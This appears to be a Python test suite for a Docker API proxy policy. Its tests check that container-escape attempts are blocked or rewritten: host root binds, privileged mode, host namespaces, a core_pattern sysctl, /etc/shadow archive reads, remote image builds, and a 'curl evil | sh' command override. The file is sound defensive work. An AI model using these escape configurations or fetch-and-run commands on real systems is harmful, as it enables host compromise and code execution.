"""The policy, exercised as a pure function.

These are the tests that say what the proxy is *for*. Each one is a thing a
compromised container manager would try, and the assertion is that it does not
work — not that it is detected, or logged, or reported, but that the request
which reaches the daemon cannot do it.
"""

import json

import policy

CREATE = "/v1.41/containers/create?name=dpasp-instance-0123456789ab"


def create_body(**overrides):
    """A plausible create request, with whatever the caller wants added."""
    body = {
        "Image": "dpasp-runner",
        "Labels": {"dpasp.role": "runner"},
        "HostConfig": {
            "NetworkMode": "web_dpasp-instances",
            "NanoCpus": 1000000000,
            "Memory": 3221225472,
            "PidsLimit": 256,
            "ReadonlyRootfs": True,
        },
    }
    for key, value in overrides.items():
        if key == "HostConfig":
            body["HostConfig"].update(value)
        else:
            body[key] = value
    return json.dumps(body).encode()


def forwarded(decision):
    assert decision.allowed, decision.reason
    return json.loads(decision.body)


# ---------------------------------------------------------------------------
# What the manager actually does still works
# ---------------------------------------------------------------------------


def test_the_calls_the_manager_makes_are_all_allowed():
    for method, target in [
        ("GET", "/v1.41/version"),
        ("GET", "/v1.41/_ping"),
        ("GET", "/v1.41/networks?filters=%7B%7D"),
        ("GET", "/v1.41/networks/bridge"),
        ("GET", "/v1.41/containers/json?all=1"),
        ("GET", "/v1.41/containers/abc123/json"),
        ("GET", "/v1.41/containers/abc123/logs?tail=20"),
        ("POST", "/v1.41/containers/abc123/start"),
        ("POST", "/v1.41/containers/abc123/stop"),
        ("DELETE", "/v1.41/containers/abc123?force=1"),
    ]:
        assert policy.decide(method, target).allowed, f"{method} {target}"

    assert policy.decide("POST", CREATE, create_body()).allowed


def test_a_create_that_is_already_correct_survives_unchanged_where_it_matters():
    config = forwarded(policy.decide("POST", CREATE, create_body()))
    host = config["HostConfig"]
    assert host["NanoCpus"] == 1000000000
    assert host["Memory"] == 3221225472
    assert host["PidsLimit"] == 256
    assert host["ReadonlyRootfs"] is True
    assert config["Labels"]["dpasp.role"] == "runner"


# ---------------------------------------------------------------------------
# The escapes
# ---------------------------------------------------------------------------


def test_the_host_filesystem_cannot_be_mounted():
    config = forwarded(
        policy.decide(
            "POST",
            CREATE,
            create_body(
                HostConfig={
                    "Binds": ["/:/host"],
                    "Mounts": [{"Type": "bind", "Source": "/", "Target": "/host"}],
                    "VolumesFrom": ["container-manager"],
                }
            ),
        )
    )
    assert config["HostConfig"]["Binds"] == []
    assert config["HostConfig"]["Mounts"] == []
    assert config["HostConfig"]["VolumesFrom"] == []


def test_privilege_cannot_be_asked_for():
    config = forwarded(
        policy.decide(
            "POST",
            CREATE,
            create_body(
                HostConfig={
                    "Privileged": True,
                    "CapAdd": ["SYS_ADMIN", "ALL"],
                    "CapDrop": [],
                    "SecurityOpt": ["seccomp=unconfined", "apparmor=unconfined"],
                    "Devices": [{"PathOnHost": "/dev/sda"}],
                    "DeviceCgroupRules": ["a *:* rwm"],
                }
            ),
        )
    )
    host = config["HostConfig"]
    assert host["Privileged"] is False
    assert host["CapAdd"] == []
    assert host["CapDrop"] == ["ALL"]
    assert host["SecurityOpt"] == ["no-new-privileges:true"]
    assert host["Devices"] == []
    assert host["DeviceCgroupRules"] == []


def test_the_hosts_namespaces_cannot_be_joined():
    config = forwarded(
        policy.decide(
            "POST",
            CREATE,
            create_body(
                HostConfig={
                    "PidMode": "host",
                    "IpcMode": "host",
                    "UTSMode": "host",
                    "UsernsMode": "host",
                    "CgroupnsMode": "host",
                    "Cgroup": "/",
                    "CgroupParent": "/",
                    "Sysctls": {"kernel.core_pattern": "|/bin/sh"},
                }
            ),
        )
    )
    host = config["HostConfig"]
    assert host["PidMode"] == ""
    assert host["IpcMode"] == "private"
    assert host["UTSMode"] == ""
    assert host["UsernsMode"] == ""
    assert host["CgroupnsMode"] == ""
    assert host["Cgroup"] == ""
    assert host["CgroupParent"] == ""
    assert host["Sysctls"] == {}


def test_procfs_masking_cannot_be_turned_off():
    """An *empty* list unmasks; only `null` means "use the daemon's own"."""
    config = forwarded(
        policy.decide(
            "POST",
            CREATE,
            create_body(HostConfig={"MaskedPaths": [], "ReadonlyPaths": []}),
        )
    )
    assert config["HostConfig"]["MaskedPaths"] is None
    assert config["HostConfig"]["ReadonlyPaths"] is None


def test_a_runner_cannot_publish_a_port_on_the_host():
    config = forwarded(
        policy.decide(
            "POST",
            CREATE,
            create_body(
                HostConfig={
                    "PortBindings": {"8000/tcp": [{"HostPort": "22"}]},
                    "PublishAllPorts": True,
                }
            ),
        )
    )
    assert config["HostConfig"]["PortBindings"] == {}
    assert config["HostConfig"]["PublishAllPorts"] is False


def test_a_runner_cannot_be_root():
    config = forwarded(policy.decide("POST", CREATE, create_body(User="0:0")))
    assert config["User"] == "10001:10001"


def test_host_networking_is_refused_outright():
    decision = policy.decide(
        "POST", CREATE, create_body(HostConfig={"NetworkMode": "host"})
    )
    assert not decision.allowed
    assert "network" in decision.reason


def test_only_the_runner_image_may_be_run():
    for image in ("ubuntu", "alpine:latest", "dpasp-runner-evil", "frontend"):
        decision = policy.decide("POST", CREATE, create_body(Image=image))
        assert not decision.allowed, image


def test_a_container_may_only_be_created_under_a_runner_name():
    for name in ("frontend", "dpasp-instance-../evil", "dpasp-instanceXX", ""):
        target = f"/v1.41/containers/create?name={name}"
        assert not policy.decide("POST", target, create_body()).allowed, name
    assert not policy.decide("POST", "/v1.41/containers/create", create_body()).allowed


def test_the_entry_point_may_not_be_overridden():
    assert not policy.decide(
        "POST", CREATE, create_body(Cmd=["sh", "-c", "curl evil | sh"])
    ).allowed
    assert not policy.decide("POST", CREATE, create_body(Entrypoint=["/bin/sh"])).allowed


def test_the_runner_label_is_applied_even_if_the_caller_omits_it():
    config = forwarded(policy.decide("POST", CREATE, create_body(Labels={"a": "b"})))
    assert config["Labels"] == {"a": "b", "dpasp.role": "runner"}


# ---------------------------------------------------------------------------
# Everything else on the daemon
# ---------------------------------------------------------------------------


def test_the_dangerous_endpoints_are_not_on_the_allowlist():
    for method, target in [
        ("POST", "/v1.41/containers/abc/exec"),
        ("POST", "/v1.41/exec/abc/start"),
        ("GET", "/v1.41/containers/abc/archive?path=/etc/shadow"),
        ("PUT", "/v1.41/containers/abc/archive?path=/"),
        ("POST", "/v1.41/containers/abc/update"),
        ("POST", "/v1.41/containers/abc/attach"),
        ("POST", "/v1.41/commit?container=abc"),
        ("GET", "/v1.41/info"),
        ("POST", "/v1.41/swarm/init"),
        ("GET", "/v1.41/secrets"),
        ("GET", "/v1.41/volumes"),
        ("POST", "/v1.41/volumes/create"),
        ("POST", "/v1.41/networks/create"),
        ("DELETE", "/v1.41/networks/web_cm"),
        ("POST", "/v1.41/networks/web_cm/disconnect"),
        ("POST", "/v1.41/images/create?fromImage=alpine"),
        ("DELETE", "/v1.41/images/frontend"),
        ("GET", "/v1.41/events"),
        ("POST", "/v1.41/containers/prune"),
        ("GET", "/v1.41/system/df"),
    ]:
        decision = policy.decide(method, target, b"{}")
        assert not decision.allowed, f"{method} {target}"


def test_listing_containers_is_forced_to_our_own_label():
    decision = policy.decide(
        "GET", "/v1.41/containers/json?all=1&filters=%7B%22label%22%3A%5B%22x%3Dy%22%5D%7D"
    )
    target = policy.rebuild_target("/v1.41/containers/json?all=1", decision.path)
    assert "dpasp.role%3Drunner" in target
    assert "x%3Dy" not in target
    assert "all=1" in target
    assert target.startswith("/v1.41/containers/json?")


def test_touching_a_container_requires_proof_that_it_is_ours():
    for method, target in [
        ("GET", "/v1.41/containers/frontend/logs"),
        ("POST", "/v1.41/containers/frontend/stop"),
        ("DELETE", "/v1.41/containers/frontend"),
        ("POST", "/v1.41/containers/frontend/start"),
    ]:
        decision = policy.decide(method, target)
        assert decision.allowed and decision.require_owned == "frontend"
        assert not decision.self_allowed, f"{method} {target} must not accept the manager"


def test_only_inspection_may_fall_back_to_the_manager_itself():
    decision = policy.decide("GET", "/v1.41/containers/abc/json")
    assert decision.require_owned == "abc" and decision.self_allowed


def test_ownership_is_read_from_the_daemons_labels_not_the_callers():
    assert policy.owns({"dpasp.role": "runner"})
    assert not policy.owns({"dpasp.role": "frontend"})
    assert not policy.owns({})
    assert not policy.owns(None)


# ---------------------------------------------------------------------------
# Build
# ---------------------------------------------------------------------------


def test_building_an_image_is_not_possible_at_all():
    """The last way to make the daemon execute something of the caller's
    choosing. Compose builds the runner image now, so nothing needs this."""
    for target in (
        "/v1.41/build",
        "/v1.41/build?t=dpasp-runner&target=dpasp",
        "/build?t=dpasp-runner",
        "/v1.41/build?remote=https://evil.example/x.tar",
    ):
        assert not policy.decide("POST", target, b"").allowed, target


def test_no_other_way_to_produce_or_alter_an_image_either():
    for method, target in [
        ("POST", "/v1.41/images/create?fromImage=alpine"),
        ("POST", "/v1.41/images/dpasp-runner/tag?repo=frontend"),
        ("POST", "/v1.41/images/load"),
        ("POST", "/v1.41/commit?container=dpasp-instance-0123456789ab"),
        ("DELETE", "/v1.41/images/frontend"),
        ("POST", "/v1.41/build/prune"),
    ]:
        assert not policy.decide(method, target, b"{}").allowed, f"{method} {target}"


def test_reading_an_images_metadata_is_still_allowed():
    """`ensureImage` looks the runner image up at startup."""
    assert policy.decide("GET", "/v1.41/images/dpasp-runner/json").allowed


# ---------------------------------------------------------------------------
# Networks
# ---------------------------------------------------------------------------


def test_a_runner_may_only_be_attached_to_the_networks_it_is_meant_for():
    body = json.dumps({"Container": "dpasp-instance-0123456789ab"}).encode()
    for network in ("bridge", "web_dpasp-instances"):
        decision = policy.decide("POST", f"/v1.41/networks/{network}/connect", body)
        assert decision.allowed and decision.require_owned
    for network in ("web_cm", "host"):
        assert not policy.decide("POST", f"/v1.41/networks/{network}/connect", body).allowed


def test_connecting_something_that_is_not_a_runner_is_checked_against_the_daemon():
    body = json.dumps({"Container": "frontend"}).encode()
    decision = policy.decide("POST", "/v1.41/networks/bridge/connect", body)
    assert decision.allowed and decision.require_owned == "frontend"
    assert not decision.self_allowed


# ---------------------------------------------------------------------------
# Shapes of request that are not requests
# ---------------------------------------------------------------------------


def test_a_create_body_that_is_not_json_is_refused():
    assert not policy.decide("POST", CREATE, b"not json").allowed
    assert not policy.decide("POST", CREATE, b'"a string"').allowed


def test_the_api_version_prefix_is_optional_and_does_not_change_the_answer():
    assert policy.decide("GET", "/version").allowed
    assert policy.decide("GET", "/v1.41/version").allowed
    assert not policy.decide("GET", "/v1.41/secrets").allowed
    assert not policy.decide("GET", "/secrets").allowed
